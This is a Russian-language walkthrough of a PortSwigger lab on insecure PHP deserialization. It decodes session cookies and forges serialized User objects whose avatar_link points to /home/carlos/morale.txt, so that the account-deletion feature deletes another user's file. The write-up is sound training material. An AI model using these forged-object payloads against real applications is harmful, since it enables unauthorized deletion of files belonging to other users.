Залогинимся под `wiener:peter`

и нажмем `Delete account`


Перейдем в `Proxy` -> `HTTP history`

и найдем запрос на удаление аккаунта
```
POST /my-account/delete 
...
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJrdXpjaDdmMXg0dzVydWZkd3RuMHQxZ2lmbDE1cG0zdSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d
```
Где куки в декодированном виде будет представляться как
```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kuzch7f1x4w5rufdwtn0t1gifl15pm3u";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/3.%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/pics%20for%20walkthrough/1.png)
и отравим данный запрос в `Repeater`

Изменим куку на следующую составляющуюся
```
O:4:"User":3:{s:11:"avatar_link";s:23:"home/carlos/morale.txt";}
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/3.%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/pics%20for%20walkthrough/2.png)
Зайдем под резервный аккаунт `gregg:rosebud`

После логина ему присвоен куки 
```
Cookie: session=; session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6IndyZ3A2a20zOG5vcXpxcHRsOHduM24yeWIwZWdqZHRsIjtzOjExOiJhdmF0YXJfbGluayI7czoxODoidXNlcnMvZ3JlZ2cvYXZhdGFyIjt9
```
В декодированном варианте будет как 
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"wrgp6km38noqzqptl8wn3n2yb0egjdtl";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/3.%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/pics%20for%20walkthrough/3.png)

далее сконфигурируем вредоносный запрос

и нажмем `Apply changes`
```
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"wrgp6km38noqzqptl8wn3n2yb0egjdtl";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/19.%20Insecure%20deserialization/3.%20Using%20application%20functionality%20to%20exploit%20insecure%20deserialization/pics%20for%20walkthrough/4.png)

От грега взяли активный `access token`

а от карлоса взяли пост запрос на удаление аккаунта

Отправим запрос и после всех редиректов получим уведомление об успешно выполненной лабораторной работе
